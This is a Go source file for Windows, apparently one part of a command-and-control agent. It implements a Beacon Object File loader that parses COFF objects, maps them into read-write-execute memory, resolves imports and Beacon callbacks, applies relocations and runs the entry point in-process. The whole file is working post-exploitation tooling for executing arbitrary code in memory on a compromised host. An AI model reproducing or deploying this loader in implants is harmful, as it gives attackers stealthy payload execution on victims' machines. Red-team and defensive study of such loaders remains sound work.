//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

const (
	IMAGE_REL_AMD64_ADDR64  = 0x0001
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32   = 0x0004
	IMAGE_REL_I386_DIR32    = 0x0006
	IMAGE_REL_I386_REL32    = 0x0014

	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000
	IMAGE_SCN_CNT_CODE    = 0x00000020
)

type coffHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSection struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type coffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type bofOutput struct {
	buf bytes.Buffer
}

var activeBofOutput *bofOutput

func bofBeaconPrintf(format uintptr, args uintptr) {
	if activeBofOutput == nil {
		return
	}
	s := readCString(format)
	activeBofOutput.buf.WriteString(s)
	activeBofOutput.buf.WriteByte('\n')
}

func bofBeaconOutput(callbackType int, data uintptr, length int) {
	if activeBofOutput == nil || length <= 0 {
		return
	}
	buf := unsafe.Slice((*byte)(unsafe.Pointer(data)), length)
	activeBofOutput.buf.Write(buf)
}

func readCString(addr uintptr) string {
	if addr == 0 {
		return ""
	}
	var b []byte
	for i := uintptr(0); ; i++ {
		c := *(*byte)(unsafe.Pointer(addr + i))
		if c == 0 {
			break
		}
		b = append(b, c)
		if i > 4096 {
			break
		}
	}
	return string(b)
}

func executeBOF(coffData []byte, args []byte, entryPoint string) string {
	if len(coffData) < 20 {
		return "Error: invalid COFF data"
	}

	r := bytes.NewReader(coffData)

	var hdr coffHeader
	if err := binary.Read(r, binary.LittleEndian, &hdr); err != nil {
		return "Error: " + err.Error()
	}

	sections := make([]coffSection, hdr.NumberOfSections)
	for i := range sections {
		if err := binary.Read(r, binary.LittleEndian, &sections[i]); err != nil {
			return "Error: reading section " + err.Error()
		}
	}

	sectionData := make([][]byte, hdr.NumberOfSections)
	sectionAddrs := make([]uintptr, hdr.NumberOfSections)

	for i, sec := range sections {
		size := sec.SizeOfRawData
		if sec.VirtualSize > size {
			size = sec.VirtualSize
		}
		if size == 0 {
			size = 64
		}

		prot := uint32(PAGE_READWRITE)
		if sec.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 || sec.Characteristics&IMAGE_SCN_CNT_CODE != 0 {
			prot = PAGE_EXECUTE_READWRITE
		}

		addr, _, err := syscall.SyscallN(getProc(mKernel32, fVirtualAlloc), 0, uintptr(size), MEM_COMMIT|MEM_RESERVE, uintptr(prot))
		if addr == 0 {
			for j := 0; j < i; j++ {
				syscall.SyscallN(getProc(mKernel32, fVirtualFree), sectionAddrs[j], 0, MEM_RELEASE)
			}
			return fmt.Sprintf("Error: VirtualAlloc for section %d: %v", i, err)
		}
		sectionAddrs[i] = addr

		if sec.SizeOfRawData > 0 && int(sec.PointerToRawData+sec.SizeOfRawData) <= len(coffData) {
			raw := coffData[sec.PointerToRawData : sec.PointerToRawData+sec.SizeOfRawData]
			sectionData[i] = raw
			copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(raw)), raw)
		}
	}

	defer func() {
		for _, addr := range sectionAddrs {
			if addr != 0 {
				syscall.SyscallN(getProc(mKernel32, fVirtualFree), addr, 0, MEM_RELEASE)
			}
		}
	}()

	symbols := make([]coffSymbol, hdr.NumberOfSymbols)
	if hdr.PointerToSymbolTable > 0 && int(hdr.PointerToSymbolTable) < len(coffData) {
		symR := bytes.NewReader(coffData[hdr.PointerToSymbolTable:])
		for i := uint32(0); i < hdr.NumberOfSymbols; i++ {
			binary.Read(symR, binary.LittleEndian, &symbols[i])
		}
	}

	stringTableOff := hdr.PointerToSymbolTable + hdr.NumberOfSymbols*18
	getSymbolName := func(sym *coffSymbol) string {
		nameBytes := sym.Name
		if binary.LittleEndian.Uint32(nameBytes[:4]) == 0 {
			strOff := binary.LittleEndian.Uint32(nameBytes[4:8])
			off := int(stringTableOff) + int(strOff)
			if off < len(coffData) {
				end := off
				for end < len(coffData) && coffData[end] != 0 {
					end++
				}
				return string(coffData[off:end])
			}
			return ""
		}
		n := string(nameBytes[:])
		if idx := strings.IndexByte(n, 0); idx >= 0 {
			n = n[:idx]
		}
		return n
	}

	output := &bofOutput{}
	activeBofOutput = output
	defer func() { activeBofOutput = nil }()

	resolveImport := func(name string) uintptr {
		name = strings.TrimPrefix(name, "__imp_")
		name = strings.TrimPrefix(name, "_")

		if name == "BeaconPrintf" || name == "BeaconPrintfW" {
			return syscall.NewCallback(bofBeaconPrintf)
		}
		if name == "BeaconOutput" || name == "BeaconOutputW" {
			return syscall.NewCallback(bofBeaconOutput)
		}

		parts := strings.SplitN(name, "$", 2)
		if len(parts) != 2 {
			return 0
		}
		dllName := strings.ToLower(parts[0])
		if !strings.HasSuffix(dllName, ".dll") {
			dllName += ".dll"
		}
		funcName := parts[1]

		dll, err := syscall.LoadDLL(dllName)
		if err != nil {
			return 0
		}
		proc, err := dll.FindProc(funcName)
		if err != nil {
			return 0
		}
		return proc.Addr()
	}

	for i, sec := range sections {
		if sec.NumberOfRelocations == 0 || sec.PointerToRelocations == 0 {
			continue
		}

		relocOff := int(sec.PointerToRelocations)
		for j := uint16(0); j < sec.NumberOfRelocations; j++ {
			off := relocOff + int(j)*10
			if off+10 > len(coffData) {
				break
			}

			var reloc coffRelocation
			binary.Read(bytes.NewReader(coffData[off:off+10]), binary.LittleEndian, &reloc)

			if int(reloc.SymbolTableIndex) >= len(symbols) {
				continue
			}
			sym := &symbols[reloc.SymbolTableIndex]
			symName := getSymbolName(sym)

			var targetAddr uintptr
			if sym.SectionNumber > 0 && int(sym.SectionNumber-1) < len(sectionAddrs) {
				targetAddr = sectionAddrs[sym.SectionNumber-1] + uintptr(sym.Value)
			} else if sym.SectionNumber == 0 {
				targetAddr = resolveImport(symName)
			}

			patchAddr := sectionAddrs[i] + uintptr(reloc.VirtualAddress)

			switch reloc.Type {
			case IMAGE_REL_AMD64_ADDR64:
				*(*uint64)(unsafe.Pointer(patchAddr)) = uint64(targetAddr)
			case IMAGE_REL_AMD64_ADDR32NB:
				delta := int64(targetAddr) - int64(patchAddr) - 4
				*(*int32)(unsafe.Pointer(patchAddr)) = int32(delta)
			case IMAGE_REL_AMD64_REL32:
				delta := int64(targetAddr) - int64(patchAddr) - 4
				existing := int64(*(*int32)(unsafe.Pointer(patchAddr)))
				*(*int32)(unsafe.Pointer(patchAddr)) = int32(delta + existing)
			case IMAGE_REL_I386_DIR32:
				*(*uint32)(unsafe.Pointer(patchAddr)) = uint32(targetAddr)
			case IMAGE_REL_I386_REL32:
				delta := int64(targetAddr) - int64(patchAddr) - 4
				*(*int32)(unsafe.Pointer(patchAddr)) = int32(delta)
			}
		}
	}

	var entryAddr uintptr
	for i := uint32(0); i < hdr.NumberOfSymbols; i++ {
		sym := &symbols[i]
		name := getSymbolName(sym)
		if name == entryPoint || name == "_"+entryPoint {
			if sym.SectionNumber > 0 && int(sym.SectionNumber-1) < len(sectionAddrs) {
				entryAddr = sectionAddrs[sym.SectionNumber-1] + uintptr(sym.Value)
				break
			}
		}
	}

	if entryAddr == 0 {
		return fmt.Sprintf("Error: entry point '%s' not found", entryPoint)
	}

	var argsPtr, argsLen uintptr
	if len(args) > 0 {
		argsPtr = uintptr(unsafe.Pointer(&args[0]))
		argsLen = uintptr(len(args))
	}

	func() {
		defer func() {
			if r := recover(); r != nil {
				output.buf.WriteString(fmt.Sprintf("\nBOF crashed: %v", r))
			}
		}()
		syscall.SyscallN(entryAddr, argsPtr, argsLen)
	}()

	for i, addr := range sectionAddrs {
		if addr != 0 && (sections[i].Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 || sections[i].Characteristics&IMAGE_SCN_CNT_CODE != 0) {
			var oldProt uint32
			syscall.SyscallN(rpVirtualProtect, addr, uintptr(sections[i].SizeOfRawData), PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
		}
	}

	result := output.buf.String()
	if result == "" {
		return "BOF executed (no output)"
	}
	return result
}
